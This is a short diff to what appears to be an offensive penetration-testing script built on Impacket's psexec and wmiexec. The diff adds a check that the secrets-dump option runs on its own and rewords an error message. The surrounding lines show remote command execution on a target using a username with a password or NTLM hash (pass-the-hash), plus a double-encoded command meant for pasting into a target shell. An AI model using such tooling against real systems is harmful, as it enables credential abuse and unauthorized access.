@@ -367,7 +367,8 @@ Create Pasteable Double Encoded Script:
 [*] Then copy and paste the following command into the target boxes command shell.
 [*] This execution script is double encoded.
 '''
-
+    if method and sam_dump:
+        sys.exit("[!] You do not execute the --secrets-dump with a method, it should be executed on its own.")
     if psexec_cmd:
         if pwd != "":
             print("[*] Attempting to access the system with, user: %s hash: %s domain: %s ") % (usr, hash, dom)
@@ -381,7 +382,7 @@ Create Pasteable Double Encoded Script:
         else:
             print("[*] Attempting to access the system with, user: %s pwd: %s domain: %s ") % (usr, pwd, dom)
         if command == "cmd.exe":
-            sys.exit("[!] You must provide a command or method of exploitation if you are using wmiexec")
+            sys.exit("[!] You must provide a command or attack for exploitation if you are using wmiexec")
         if attacks:
             attack=wmiexec.WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
             attack.run(target)
